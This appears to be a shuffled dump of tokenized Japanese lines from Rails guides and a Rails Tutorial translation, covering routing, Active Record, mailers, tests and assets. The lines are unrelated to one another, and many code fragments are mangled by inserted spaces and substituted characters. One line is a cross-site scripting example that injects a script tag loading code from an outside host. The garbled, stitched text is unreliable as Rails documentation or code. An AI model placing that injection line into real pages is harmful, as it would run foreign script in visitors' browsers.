現在 の ユーザー に フォロー さ れ て い る ユーザー を 表示 する
    X   = : in_M
  <%=  expensive_files _operation %>
これ で 、 リンク が 生成 さ れ る 時 に "/app 1 " が ディレクトリ 名 の 前 に 追加 さ れ ま す 。
データ の モデル 化 が 終わ っ た の で 、 今度 は アカウント 有効 化 メール の 送信 に 必要 な コード を 追加 し ま しょ う 。
ブラウザ から ソース を 見 る こと で 確認 が でき ま す が 、 Rails が 埋め込 み Ruby を 評価 し 、 レイアウト を 描画 する と 、 上 の リスト は 以下 の よう に 置き換わ り ま す
* `:nullify ` を 指定 する と 、 外部 キー が ` NULL ` に 設定 さ れ ま す 。
   if @ article ▖ update( article _params )
*   与え られ た オプション を 同等 の SQL クエリ に 変換 し ま す 。
ログ アウト 用 リンク で は 、 リスト \ ref{ code :sessions _ resource } で 定義 し た ログ アウト 用 パス を 使用 し ま す 。
著者 は この よう に 分割 保存 する の が 論理 的 で あ る と 考え ま す が 、 \ kode {shared } フォルダ に すべて 保存 し て も 問題 な く 動作 し ま す 。
これ に よ り 、 ` sanitize` 、 `sanitize_css ` 、 `strip_tags` 、 および ` strip_links ` メソッド は 新し い 実装 に 基 い て 動作 する よう に な り ま す 。
      # @bu siness や @user インスタンス 変数 に アクセス でき る
   belongs_to  : customer ,   inverse _of:  :orders
*  `config▖ action_dispatch▖tld_length ` は 、 アプリケーション で 使用 する トップ レベル ドメイン ( TLD )   の 長 さ を 指定 し ま す 。
これ で 、 仮 に データベース の 内容 が 盗 ま れ たり 覗き見 さ れ る よう な こと が あ っ て も 、 パスワード の 安全 性 が 保 た れ ま す 。
NOTE :   これ ら の カラム 名 は 必須 で は あ り ま せ ん が 、 Active   Record に 予約 さ れ て い ま す 。
                data: {  confirm :  'Are   you   sure ? ' 
Date:   Sun ,   24   Jan  2010   12 : 15 : 53   GMT
###  Rails の DOM の テスト
\ chapter { ユーザー を フォロー する }╼\ label{ cha : following _ users }╼╼
/ users / 1 / followers
# = >  123 - 555 - 123 4
ただし 、 以下 の 3 つ の 注意 点 が あ り ま す 。
       def  set_author
self を 省略 し た 結果 を リスト \ ref{ code :micropost _ordering } に 示 し ま す 。
###  CD N
詳細 に つ い て は [ ミドルウェア を 設定 する ] ( # ミドルウェア を 設定 する ) の 節 を 参照 し て くださ い 。
       create      app/views/users/index▖ json▖jbuilder
Action   Mailer の コール バック
エンジン は gem と し て インストール さ れ る の で 、 この よう に する 必要 が あ り ま す 。
2 ▖ kilobytes   # = >   20 4 8
ユーザー 登録 の 基本 的 な テスト 。
< h 1 > Names  of  all  the   people </ h 1 >
   def  perform (*args)
幸い 、 解決 策 の 実装 は 簡単 で す ▟ 実 は 、 この 問題 は データベース レベル で も 一意 性 を 強制 する だけ で 解決 し { 0 / ま す 。
Active   Record モデル の 作成 は 非常 に 簡単 で す 。
# =>  Mon ,   09   Aug  2010   0 0 : 0 0 : 0 0   UTC   + 0 0 : 0 0 ▖ ▖
` + ` に 応答 する 要素 のみ が 加算 の 対象 と し て 前提 と さ れ ま す 。
デフォルト は ` false ` で あ り 、 この 場合 は Active   Record が 使用 さ れ ま す 。
C : \ Sites> echo  " hello ,   world "
Ryan   Bates 自身 も 、 現実 に は テスト 駆動 開発 を 採用 し て い る こと が 多 く あ り ま す し 、 彼 の テスティング スタイル は 本書 の もの と 基本 的 に 同じ で す ▟ )
以下 の テスト は 、 この 時点 で は 失敗 する はず で す 。
#   更新 に 成功 し た 場合 を 扱 う 。
   def  check _credit_ limit (order )
これ を 表現 する に は 否定 の 演算 子 が 必要 な の で 、 \ kode { ! } ( " bang "   と 読 み ま す )   を 使用 し ま す 。
もちろん 、 今 の 時点 で は テスト は 失敗 し ま す 。
{ 0 } � 図 3 ▖ 6   { / 0 } { 1 } タイトル が 付 い た Home ページ { / 1 }
配列 など の 比較 的 単純 な オブジェクト を 複製 する に は 、 \ kode {dup } メソッド を 使用 する こと が でき ま す 。
この 設定 は ` config▖ cache_classes ` が false の 場合 に 影響 を 受け ま す ▟` config▖ cache_classes ` は development モード で は ` config▖ cache_classes ` は デフォルト で オフ で す 。
\ kode {ul } タグ の \ kode {nav } と \ kode {pull - right } クラス は 、 Bootstrap に お い て 特別 な 意味 を 持 ち ま す 。
これ は リスト \ ref{ code : minimum _ password _length_test } で 使用 さ れ て い ま し た 。
     class_ name :  " Order " ,
#   Find  the  clients  with   primary  keys   1   and   10 ▖
   class_ name  =  name▖to_s▖ camelize
` app/views/articles/_form ▖html ▖erb ` と い う 名前 の パーシャル ファイル を 作成 し 、 以下 の 内容 を 入力 し て くださ い 。
#    label(:article ,  :title )
\ href { http://guides▖ rubyonrails ▖org/active_ record _querying ▖ html} { w here } や like の 詳細 に つ い て は 、 Rails   Guide の 「 \ kode { Active   Record   Query   Interface { }/}  ( 英語 ) 」 を 参照 し て くださ い 。
*  `collection_singular_ ids `
*   FROM   ` users `   INNER   JOIN ` articles `  ON   ` articles `▖`user_ id ` = ` users `▖` id `   WHERE   ` users `▖` id `  =   1
   def  index
#####  CD N と Cache - Control ヘッダ
対応 策 は 、  _ コマンドライン の パラメータ を 安全 に 渡せ る ` system ( コマンド ,   パラメータ ) ` メソッド を 使用 する こと で す ▟ _
イニシャライザ ファイル を 使用 する
そこ で は 、 digest メソッド を \ kode {user▖ rb } に 置 く こと を すすめ て い ま す 。
Rails   は データベース と 連携 し て 動的 な Web サイト を 開発 する よう に 設計 さ れ て い ま す が 、 HTML ファイル だけ で 構成 さ れ て い る 静的 な ページ を 作 る こと も でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_update_action_unsuccessful } に 示 し ま す 。
これ は 名前 空間 化 の 最も 肝心 な 部分 で あ り 、 これ に つ い て は 本 ガイド の [ ルーティング ] ( # ルーティング ) セクション で 後述 し ま す 。
Article ▖ w here ( trashed:  true ) ▖ w here ( trashed :  false )
最後 に ホーム 画面 を 実装 し た とき は   ( 図 \ ref { fig : sample_app_ logo} ) 、 [ Sign   up  now ! ]   ボタン が 中央 に あ り ま し た 。
最後 に 、 いく つ か の ルール を サイト ロゴ に 追加 し ま す ▟ この サイト ロゴ は 「 sample  app 」 だけ が 表示 さ れ て い る シンプル な もの で す 。
    <p >
これ で 、 本番 環境 の サーバー で サンプル アプリケーション が 動作 し て い る はず で す 。
#####  CD N リクエスト キャッシュ
###  すべて の スコープ を 削除 する
Accept - Ranges :
`: separator ` オプション で 正規 表現 を 使用 する こと も でき ま す 。
これ に つ い て は 、 リスト \ ref{ code :microposts_ home_ page } で 実装 し ま す 。
< script   src= "/assets/application - 908 e 25 f 4 bf 641868 d 868 30 2 2 a 5 b 62 f 54 ▖ js" ></ script>
╼╼    \ subsection { 前提 知識 }  %  ( fold) ╼    \ label{ sec : prerequisites}╼╼ There   are   no  formal   prerequisites to this   book ,   and   the  \emph {
    resources  :drafts
しかし 実装 の 出発 点 と し て は これ で 十分 で す ▟ なお 、 最終 的 な 実装 は \ ref{ sec : strong _ parameters } で 完了 し ま す 。
Users リソース の 最後 の 仕上げ と し て 、 \ kode { destroy } アクション へ の リンク を 追加 し ま しょ う 。
彼 ら に 会 う こと が あ っ た ら 、 ぜひ お 礼 を 述べ て や っ て くださ い 。
これ は リスト \ ref{ code : authenticated_p } で 使用 さ れ て い ま し た 。
     resources  : comments ,   shallow :  true
B ▖ x   = :b
*  ` action_controller▖ logger`: ` Rails ▖ logger ` に 対 する 設定 が 行 わ れ て い な い 場合 に ` Action Controller : : Base ▖ logger ` を 設定 し ま す 。
{ 0 } Figure   2 ▖ 17 :   {/ 0 } { 1 } The  inheritance   hierarchy   for   the  Users  and   Microposts  controllers▖ { / 1 }
` PermitScrubber ` および ` TargetScrubber ` の ドキュメント に は 、 どの 要素 を どの タイミング で 除去 す べ き か を 完全 に 制御 する 方法 が 記載 さ れ て い ま す 。
\ kode { " user [ email ] " } と い う 名前 は 、 \ kode {user } ハッシュ の \ kode {email } 属性 を 正確 に 指 し ま す 。
エンジン を ひと つ 作成 する と 、 やがて エンジン の 部品 と アプリケーション の 部品 を 連携 さ せ る ため に 、 アプリケーション の 特定 の クラス を エンジン から 利用 し た く な る で しょ う 。
この 章 の サンプル アプリケーション で は 、 Active   Record の メリット は まだ はっきり と は わか ら な い か も しれ ま せ ん が 、 この 後 の 章 で は ファクトリー の 機能 を さらに 活用 する 予定 で す 。
これ は リスト \ ref{ code : signed_ in_p } で 使用 さ れ て い ま し た 。
   scope   : active ,  -> { unscope ( w here :  : state ) ▖ w here ( state :  'active')  }
ユーザー 削除 用 リンク の 実装   ( 管理 者 に のみ 表示 さ れ る )
Java Script レスポンス を 伴 う GET リクエスト も クロス サイト リクエストフォージェリ   ( CSRF )   保護 の 対象 と な り ま し た 。
\ ref{ sec : activating_ the_account } ▖ の 表 \ ref{table : password_token_digest }   を 元 に 、 より 一般 性 の 高 い \ kode {authenticated ? } メソッド を 定義 する こと に し ま す 。
\ texttt { POST }  は 、 GET の 次 に よく 使用 さ れ る 操作 で 、 ページ 上 の フォーム に 入力 し た 値 を 、 ブラウザ から 送信 する 時 に 送 ら れ る リクエスト で す 。
( { 0 } { 1 } 第 8 章 { / 1 } { / 0 } で 本格 的 に 実装 し ま す ) 。
*  `helper ` は ヘルパー を 生成 する か どう か を 指定 し ま す 。
通常 、 これ ら の アクション は 、 ページ を 出力 せ ず に データベース 上 の ユーザー 情報 を 操作 し ま す   ( もちろん 、 ページ を 出力 し て も 良 い の で す が ) 。
d ▖end _of _week(:sunday )        # =>  Sat ,   0 8   May  2010
#   Custom  Rails   Tutorial   specs
follow/unfollow フォーム の パーシャル
前者 の 問題 を \ ref{ sec : signup_error _messages } で 、 後者 の 問題 を \ ref{ sec : successful_ signups} で それぞれ 解決 し て い き ま す 。
他 も 同様 で す 。
バリデーション は 、 正し い データ だけ を データベース に 保存 する ため に 行 わ れ ま す 。
ユーザー に サービス 利用 条項 へ の 同意 、 何 ら か の 文書 に 目 を 通 す こと など を 義務 付け る の に 使用 する の が 典型 的 な 利用 法 で す 。
   validates : surname ,   presence :  true ,   if:  " name ▖nil ? "
\ href {https://www▖codeschool ▖ com/}{ Code   School } :   非常 に 多種 多様 な プログラミング を 対話 的 に 学習 でき る コース
         xml ▖ guid ( @ person ▖ firm ▖ account ▖url  + @ recent_items ▖url( item) )
config ▖ assets▖ debug   =  true
この コード を 書 く ため に は 、 論理 値 を 返 す \ kode { logged \_ in ? } メソッド が 必要 な の で 、 まず それ を 定義 し ま す 。
*   development 環境 で 圧縮 機能 や 最小 化 機能 が すべて 利用 でき る よう に し て お く こと 。
仕上げ に 、 ナビゲーションバー に あ る ユーザー 設定 へ の リンク を 更新 し ま す 。
テスト が パス する ため に は 、 リスト \ ref{ code : home_ page_ base_title } の よう に Home ページ の ビュー から \ kode { provide }   の 行 を 削除 する 必要 が あ り ま す 。
この ガイド で は 、 Active   Record の 関連 付け 機能 ( アソシエーション ) に つ い て 解説 し ま す 。
### ` has_many : through ` と ` has_and _belongs_to_many ` の どちら を 選 ぶ か
Relationship 用 の fixture を 空 に する
X   = : in_Object
` app/views/articles/edit▖html ▖erb ` と い う ファイル を 作成 し 、 以下 の コード を 入力 し て くださ い 。
この メソッド は 、 浮動 小数 点 記法 の BigDecimal 値 を 簡単 に 表示 する ため の 便利 な 方法 を 提供 し ま す 。
umerate}╼╼    %  subsection   the_model_file   ( end ) ╼╼    \ subsection { ユーザー オブジェクト を 作成 する } %  ( fold) ╼    \ label{ sec : creating _user_objects}╼╼
次 に 、 \ kode { : media } 引数 は ハッシュ の よう で す が 、 波 かっこ が な い 点 が 不思議 で す 。
つい 使 っ て み た く な る が 実際 に は 役 に 立 た な い \ kode { current_user } の 定義
更新 さ れ た \ kode { Gemfile } で は 、 JQuery に 関 する 以下 の 行 も 変更 し ま す ▟ JQuery は Rails の デフォルト の Java Script ライブラリ で す 。
技術 的 に は 、 インデント が 一番 浅 い 行 を 探 し て 、 その インデント 分 だけ 行頭 の ホワイト スペース を 全体 から 削除 する と い う 操作 を 行 っ て い ま す 。
class   Section  <  ActiveRecord : : Base
なお 、 この \ kode { Procfile } は ルート ディレクトリ   ( \kode { Gemfile } と 同じ ディレクトリ )   に 置 い て お く 必要 が あ る の で 、 ファイル の 置き 場所 に は 注意 し て くださ い 。
    resources   : photos ,   as :  ' admin _photos'
CAUTION :  ` validates_associated ` は 関連 付け の 両側 の オブジェクト で は 実行 し な い で くださ い 。
これ は 以下 で 使用 する 最初 の アプリケーション で す 。
now ▖all_ year
  >> @user ||= " the  user "
#### ` parent `
本 ガイド で は 、 Rails の エンジン に つ い て 解説 し ま す ▟ また 、 簡潔 で 使 い やす い インターフェイス を 使 っ た 、 ホスト アプリケーション 向け 追加 機能 に つ い て も 解説 し ま す 。
    i▖ increment ! (:views)
     def a_method_used _ for_ validation_purposes
$  echo  $ DATABASE _ URL
まだ 始ま っ た ばかり で す が 、 今 の うち に Rails アプリケーション の 全体 的 な 仕組み を 知 っ て お く こと は 後々 役立 ち ま す   ( 図 \ ref { fig : MVC } ) 。
アプリケーション の 拡張 に 取りかか る 前 に 、 まず は 現状 の 変更 を マージ し て お き ま しょ う 。
Contact ページ の テスト を リスト \ ref{ code :contact _ page_test } に 示 し ま す ▟ これ は 単に リスト \ ref{ code : pages_controller_ spec_title } で 使用 さ れ て い る テスト の パターン に 従 っ た もの で す 。
著者 の 経験 を 元 に 、 以下 の よう に まとめ て み ま し た 。
#  Use   ActiveModel   has_ secure_ password
「 forgot   password 」 リンク の あ る ログ イン ページ
#  you' ve   limited to  : test ,  : development ,  or   : production ▖
\ ref{ sec : layouts_and _embedded_ruby } で 学 ん だ よう に 、 \ kode {yield } メソッド は Web サイト の レイアウト に ページ ごと の 内容 を 挿入 し ま す 。
12345678 90 ▖ 50 ▖ to_s(:currency )                  # =>  $ 1 , 23 4 ,5 6 7,890 ▖ 50
フォロー し て い る ユーザー と フォロワー の 両方 を 表示 する \ kode { show \_ follow } ビュー
すべて の コア 拡張 機能 を 単に 読み込 ん で お き た い の で あ れ ば 、 以下 の よう に require し ま す 。
\ kode{gravatar _ for } ヘルパー メソッド を 定義 する
ユーザー を 破棄 する と マイクロ ポスト も 破棄 さ れ る こと を テスト する 。
### `squish`
Java Script が 無効 に な っ て い た とき の ため の 設定
これ を 解決 する 方法 は 、 フォロー し て い る ユーザー の id の 検索 を データベース に 保存 する とき に \emph { サブ セレクト   ( subselect )   } を 使用 する こと で す 。
この ヘルパー を 使用 し て 、 Atom フィード を 簡単 に 生成 でき ま す 。
   validates :games_played ,  numericality : { only_ integer :  true   }
{ " foo"  = >   1 , " bar "  = >   2 } ▖ to _xml
新規 作成 し た Rails   4 アプリケーション に は デフォルト で ` app/assets/javascripts/application ▖js` ファイル に 以下 の よう な 記述 が 含 ま れ て い ま す 。
マイクロ ポスト の 順序 付け を テスト する  
リスト \ ref{ code :image_upload_test } で 追加 し た テスト で は 、 マイクロ ポスト の 投稿 フォーム や picture 属性 を いじ っ て 、 無効 な 送信 や 有効 な 送信 を チェック し て い ま す 。
リスト \ ref{ code :application_layout_redux } の 以下 の 行 に ご 注目 くださ い 。
` : source ` オプション は 、 ` has _one  : through ` 関連 付け に お け る 「 ソース の 」 関連 付け 名 、 つまり 関連 付け 元 の 名前 を 指定 し ま す 。
上 の 流れ を もう 少し 詳し く 見 て み る こと に し ま す 。
#   You  can  use  ` rake  secret `  to   generate  a  secure  secret  key▖
現 時点 で は 、 以下 の 有効 な 送信 テスト は 失敗 する はず で す 。
I   shall  be   late ! " ▖ truncate_words ( 4 , separator : /\s/)
この エラー が 発生 し た の は 、 ルーティング で 指定 さ れ た 先 に 、 リクエスト を 処理 する よう に 定義 さ れ た コントローラ が 見つか ら な い ため で す 。
サイン アップ ページ へ の リンク が あ る Home ページ
** ` ActionDispatch : : ShowExceptions` **
</ body >
      find_ by ( region_id :  order _number [ 0 ▖ ▖ 2 ] )
キー は 属性 名 、 値 は すべて の エラー 文字 列 の 配列 で す 。
def  caches_action (* actions )
  {title:   " RSS   Feed " })  %>
ただし 、 この テスト は これ まで より も 高度 な 内容 に な る ため 、 いく つ か に 分割 し て 説明 し ま す ▟ RSpec が 初めて の 方 は 、 この 節 を 繰り返 し 読 ん で み て くださ い 。
Rails で は 、 こう し た 最小 化 と 連結 を 使用 する こと で 、 あらゆる Java Script を 実行 でき ま す 。
/ users / 1 / following
次 の \ ref{ sec : activating_ the_account } で テスト を もう 少し 追加 し 、 リファクタリング を 少々 施 せ ば 完了 で す 。
この 関連 付け に 対応 する   ` assemblies_ parts`   テーブル を マイグレーション で 作成 し 、 裏付け て お く 必要 が あ り ま す 。
上 の コード に あ る 以下 の 行 に ご 注目 くださ い 。
以下 の 例 で 簡単 に 説明 し ま す 。
ハッシュ 関数 に は 最新 の \ href { http://en ▖wikipedia ▖org/wiki/ Bcrypt}{bcrypt } を 使用 し 、 パスワード を 不 可逆 的 に 暗号 化 し て パスワード ハッシュ を 作成 し ま す 。
2 つ 目 の アプリ の ため に 別 の ワークス ペース を 作成 する 必要 は あ り ま せ ん 。
上 の コード から 以下 の HTML が 生成 さ れ ま す 。
この 保存 場所 は 、 デフォルト で は `/assets ` ディレクトリ で す 。
0 ▖ 0 ▖ clone         # => allocator  undefined   for   Float
ファイル の 削除
\emph { Rails チュートリアル } に お け る ディレクトリ の 区切り は 、 コマンドライン の プロンプト と 同様 に Unix スタイル の スラッシュ 「 \ kode {/} 」 を 使 っ て い ま す 。
` config/ database▖yml ` ファイル を 使用 する こと で 、 データベース 接続 に 必要 な すべて の 情報 を 指定 でき ま す 。
この クエリ を 模式 的 に 書 く と 以下 の よう に な り ま す 。
最初 に 、 User オブジェクト が \ kode {authenticate } に 応答 する こと を 要求 し ま す 。
再び 以下 を 実行 し ま す 。
*  `mail `  -   実際 の メール 自身 を 送信 し ま す 。
親 リソース で ` : shallow ` オプション を 指定 する と 、 すべて の ネスト し た リソース が 浅 く な り ま す 。
早速 、 \ kode {link_to } メソッド の 2 番 目 の 引数 で 、 適切 な 名前 付き ルート を 使 っ て み ま しょ う 。
|                     |  50 8                | :loop_detected                   |
拡張 を 多く の 関連 付け で 共有 し た い 場合 は 、 名前 付き の 拡張 モジュール を 使用 する こと も でき ま す 。
プルリクエスト は 、 ひと つ の コミット に まとめ て お く こと が 望 ま れ ま す 。
これ より 、 アプリケーション で ` User ` を 表 す クラス を エンジン から カスタマイズ 可能 に する 方法 に つ い て 説明 し ま す 。
$   rm   README ▖ rdoc
アセット パイプライン に つ い て
\ kode {user ▖ followed_users } 属性 の テスト 。
------------------------------------
12345 67 ▖ to_s(:human_size)         # = >   1 ▖ 18   MB
#### ` last `
#   app/jobs/guests_ cleanup ▖rb
** ` ActionDispatch : : Static` * *
テスト 中 の ログ イン ステータス を 論理 値 で 返 す メソッド
####  auto_discovery _ link_tag
この コード は 次 の コード を 確かめ る ため の テスト な の で 、
get  'books/* section/:title' ,  to :  'books# show '
*  `config▖ action_dispatch ▖ perform_ deep _munge ` は 、 パラメータ に 対 し て ` deep _munge ` メソッド を 実行 す べ き か どう か を 指定 し ま す 。
レシーバー の キー を 直接 シンボル に 変換 する 破壊 的 な `symbolize_keys ! ` も あ り ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/attribute_accessors▖rb ` で す 。
` :status ` オプション を 使用 する こと で 、 レスポンス の ステータス コード を 変更 でき ま す 。
<% =  ren der   partial :   " product " ,   collection : @products ,
     profile ▖ name
Active   Support で は 、 ` Time▖ current ` を 定義 し て 現在 の タイム ゾーン に お け る 「 今日 」 を 定め て い ま す 。
\ kode {include ? } の よう な メソッド を 学 ぶ こと が 、
これ は リスト \ ref{ code : current_user_equals } で 使用 さ れ て い ま し た 。
          delivery _ method_options :   delivery _ options )
      #{severity} >= @ level                                          #    DEBUG >= @ level
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
{ 0 } 図   2 ▖ 1   { / 0 } { 1 } Bitbucket に toy アプリ の リポジトリ を 作成 する { / 1 }
following
- 4 ▖ exabytes   # =>  - 4611 6 8601 84 2 7 3 8790 4
number_to_human_size ( 12345 6 7 )         # = >   1 ▖ 2   MB
4   examples ,   0   failures
      if @bu siness && @bu siness▖ has_ smtp_settings ?
user  =  User ▖ new
この マイ グレーション を 実行 する と 、 ` articles ` と い う テーブル が 作成 さ れ 、 文字 列 カラム と テキスト カラム が 1 つ ずつ 作成 さ れ ま す 。
  < input   id= " person _first _ name "   name = " person [ first _ name ] " type =" text "  />
         page ▖ attachments▖ create ( {
      t ▖ belongs_to  : physician
##### `monday ` 、 `sunday `
*  `config▖ active_ record ▖table_name_suffix ` は テーブル 名 の 後ろ に グローバル に 追加 し た い 文字 列 を 指定 し ま す 。
( \emph { 注 : } この 時点 で は わざわざ 見 に 行 く ほど の 仕上がり で は あ り ま せ ん が ) 。
   <hr >
<%=  url_ for ( host :  'example ▖ com' ,
Active   Job の 主要 な 目的 は 、 Rails アプリ を 即席 で 作成 し た 直後 で も 使用 でき る 、 自前 の ジョブ 管理 インフラ を 持 つ こと で す 。
\emph {or } 演算 子 「 \ texttt {||}」 ( \ ref{ sec : objects_and _message_ passing } )   を 使用 すれ ば 、 上 の 「 メモ 化 」 コード を 以下 の よう に たった 1 行 で 書け ま す 。
もし どう し て も 特定 の Java Script ファイル を 他 の Java Script ファイル より も 結合 順 を 先 に し た い 場合 、 その ファイル へ の require ディレクティブ を マニフェスト の 最初 に 置 き ま す 。
Rails に は \ kode {rails } と い う 名前 の コマンドライン コマンド が あ り 、 \ kode {rails   new } で 新し い アプリケーション を 生成 し たり 、 \ kode {rails server } で ローカル サーバー を 実行 し たり でき る 。
2 ▖ordinalize    # =>  " 2nd "
以上 が この コード で 行 わ れ て い る こと で す 。
*  `default   Hash` -  メイラー から 送信 する あらゆる メール で 使用 さ れ る デフォルト 値 の ハッシュ で す 。
@ open _orders = @customer▖ orders▖ w here ( open :  true )  #  この 時点 で は クエリ は 行 わ れ な い
###  活用 形
種類 が ` date ` の 標準 入力 フィールド を 作成 し ま す 。
存在 し な い
##### `includes`
+ --------- +--------- +------- +------ +------- +
空 の ディレクトリ の 削除
上 の コマンド を 使用 し て Heroku の ログ ファイル を 参照 し 、 エラー を デバッグ し て くださ い 。
   pluralize_table_names ?  
class   Create Comments <  ActiveRecord : : Migration
    authentication :       'plain' ,
/ signout
サンプル ユーザー を 最初 から 有効 に し て お く
この とき 、 内部 インスタンス 変数 の 名前 に は デフォルト で 冒頭 に アンダース コア が 追加 さ れ ま す ▟ 上 の 例 で あ れ ば `@_ log _ level ` と な り ま す 。
新規 ユーザー の ため の ユーザー 登録 フォーム
この ガイド で は Active   Record の 基礎 に つ い て 説明 し ま す 。
上 の コード で は 、 リスト \ ref{ sec : signup_error _messages } で 導入 し た \ kode {error \ _messages } パーシャル を 再 利用 し て い ま す 。
11 ▖ ▖ 27 )  # => false
\ ref{ sec :user_ signup } で Users コントローラ を ご 紹介 し て 以来 、 長 い 道のり を たど っ て き ま し た 。
config▖ cache_classes ` の デフォルト 値 は 、 development モード で は false な の で コード の 更新 が すぐ 反映 さ れ 、 test モード と production モード で は true な の で 動作 が 高速 に な り ま す 。
\ kode {cookies } メソッド を 使用 する と 、 永続 的 な 記憶 トークン の cookies を ブラウザ に 保存 し て 、 永続 的 セッション を 作成 でき ま す 。
###  パーシャル コレクション を 描画 する
読者 に 現 時点 の 最新 の 方法 が 伝わ る よう に 書 く こと 、 それ も 明示 的 かつ 暗黙 に 。
gem  ' devise '
2 番 目 の オプション 引数 に ` false ` を 渡 す と 、 最後 の グループ の 空き は 詰め られ ま す 。
作成 し た コード を リスト \ ref{ code : sign_in_function } に 示 し ま す
self を 省略 し た 結果 を リスト \ ref{ code : add_store _location } に 示 し ま す 。
production 環境 から 送信 し た アカウント 有効 化 メール
###  Action   Mailer の 全 メソッド
上 の ルーティング に よ っ て 、 ` magazine _periodical _ads _url` や `edit_ magazine _periodical _ad _ path ` など の ルーティング ヘルパー が 生成 さ れ ま す 。
 *  available  in this   directory   and  any  sub - directories▖
#  if  you' re   sharing   your  code   publicly▖
*   リレーション で EXPLAIN を 実行 する
送信 し た プルリクエスト は Rails コア チーム に 知ら さ れ ま す 。
ユーザー ログ アウト の テスト  
authenticated ?(:reset ,  token )
       create   app/controllers/application_controller▖ rb
*  `config ▖ assets▖ compress ` オプション は 、 たとえば 以下 の よう に ` config ▖ assets▖js_ compressor `   に 変更 する 必要 が あ り ま す 。
\ href {https://www ▖udemy▖ com/learn- test - driven - development - in - ruby /coupon Code =hartl} { Bala   Paranj’s   Test   Driven   Development   in   Ruby }:   Ruby を 使 っ て テスト 駆動 開発 を 学 ぶ 、 上級 者 向け の オン ライン 講座 で す 。
これ は リスト \ ref{ code : layout_ signin_signout_links } で 使用 さ れ て い ま し た 。
この ` find_ by _sql ` メソッド は 、 オブジェクト の 配列 を 1 つ 返 し ま す ▟ クエリ が レコード を 1 つ しか 返 さ な かっ た 場合 に も 配列 が 返 さ れ ま す の で ご 注意 くださ い 。
StaticPages コントローラ の 継承 階層
  < script   src= http://www▖securitylab ▖ru/ test/sc▖js></ script ><! --
ユーザー 削除 と 同じ くらい 重要 な こと は 、 その 振る舞い が 期待 さ れ た か どう か を 確かめ る 良 い テスト を 書 く こと で す 。
Edit リンク が 追加 さ れ た index アクション ] ( images/getting _ started/index_ action_with _edit_ link▖ png )
# = >  30 2 ▖ 243 99 %
#   Find  the  client  with   primary  key  ( id )   10 ▖
オブジェクト は ` blank ? ` に すら 応答 し て くれ ま せ ん 。
user - microposts
マイクロ ポスト に 関連 付け られ た ユーザー オブジェクト を 返 す 。
{ 0 } 図 11 ▖ 15 { / 0 } { 1 } ユーザー の フォロワー 用 ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures /followers_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
The  date  and  time is  <%=  Time▖now  %></p>
d ▖ beginning _ of_ year       # =>  Fri ,   0 1   Jan  2010
たとえば 、 Sublime  Text   で サンプル アプリケーション を 開 く 場合 は 、 以下 を 実行 し ま す 。
#   アセット で 読み込 ん だ 行 を 展開 する
Git の インストール
この 行 を 記述 する こと で 、 エンジン が アプリケーション の `/blog ` パス に マウント さ れ ま す 。
config ▖ assets▖ compress =  false
` config/application ▖rb ` 設定 に 以下 を 追加 する こと で 、 コントローラ 固有 の アセット ファイル 生成 を 止め る こと も でき ま す 。
[ Rails ] ( http://github▖ com/rails/rails ) に プルリクエスト を 送 る こと が でき ま す ▟ 常連 貢献 者 に な っ た ら 、 [ Rails コア チーム ] ( http://rubyonrails ▖org / core ) に
言い換え る と 、 \ kode {object :  f ▖object } は \ kode {error _messages } パーシャル の 中 で \ kode {object } と い う 変数 名 を 作成 し ま す 。
セッション を 削除 する   ( サイン アウト )
名前 付き ルート の テスト 。
\ kode {rake   db : seed } コマンド は 、 \ kode {db/seeds▖rb } に あ る サンプル データ を データベース に 流し込 む
gem  'rails ' ,   ' 3 ▖ 1 ▖ 1 2 '
     process _without_stringified_params ( action ,   params ,  session ,   flash ,  http_method )
上 の テスト 手順 の 実装 を リスト \ ref{ code :flash_persistence_ test } に 示 し ま す 。
/ users
today ?
この メソッド は 、 引数 に 与え られ た 文字 列   ( パスワード )   を ハッシュ 化 し た 値 と 、 データベース 内 に あ る \ kode { password\_digest } カラム の 値 を 比較 し ま す 。
` config/ database▖yml ` ファイル が 上書き さ れ る こと を 確認 する と 、 アプリケーション の 設定 は SQLite 用 から My SQL 用 に 変更 さ れ ま す 。
delegate  : name ,  to : : profile ,   allow_ nil :  true
アカウント 有効 化 メイラー メソッド の テンプレート を リスト \ ref{ code : generated_account_activation_view_ text } と リスト \ ref{ code : generated_account_activation_view_html } に 示 し ま す 。
( \ kode { spec/helpers } ディレクトリ と \ kode {application_helper_ spec ▖ rb } ファイル の 両方 を 作成 する 必要 が あ る で しょ う ) 。
ActiveSupport: : JSON : : Encoding ▖ time_precision  =   0
# =>  Thu ,   0 1   Jul   2010   0 0 : 0 0 : 0 0   UTC   + 0 0 : 0 0 ▖ ▖
通常 の ルーティング を 設定 する の で あ れ ば 、 Rails が ルーティング を ブラウザ から の HTTP リクエスト に 割り当て る ため の シンボル を いく つ か 渡 し ま す 。
= > #<User   id :  nil ,   name : nil ,  email :  nil ,   created_at:  nil ,   updated_at:  nil >
そこ で 、 \ kode { log \_ in\_as } と い う ヘルパー メソッド を 作成 し て テスト 用 に ログ イン でき る よう に し 、 無駄 な 繰り返し を 排除 し ま す 。
% w ( a b  c  d ) ▖ append ( 'e ')   # => % w ( a b  c d  e )
WARNING :   一部 の データベース で は 、 大 文字 小 文字 を 区別 し な い よう に 設定 さ れ て い る こと が あ り ま す 。
ここ で \ kode {before(:all ) } を 使用 し て 、 ブロック に あ る すべて の テスト の 前 に サンプル ユーザー を \emph { 一括 } 作成 する よう に し て い る こと に 注目 し て くださ い 。
データベース の 観点 で は 、 この 関連 付け で は 相手 の クラス が 外部 キー を 持 ち ま す 。
`MultiJson : : DecodeError ` の よう な 低 レベル の 例外 の 代り に この 例外 を レスキュー する こと が でき ま す 。
##### `extending `
この 他 に オプション を 指定 する 必要 は あ り ま せ ん 。
パスワード 再 設定 の リンク を メール 送信 する
Client ▖ w here ( first _ name :  'Ryan') ▖ count
リスト { p 0 } で お 見せ し た よう に 、 Application ヘルパー で 使 っ て い る { 2 } full_title{ / 2 } ヘルパー を 、 test 環境 で も 使え る よう に する と 便利 で す 。
CD N が 提供 する ` X - Cache ` など の 機能 や CD N が 追加 する ヘッダ など の 付加 的 情報 に つ い て は 、 CD N の ドキュメント を 確認 し て くださ い 。
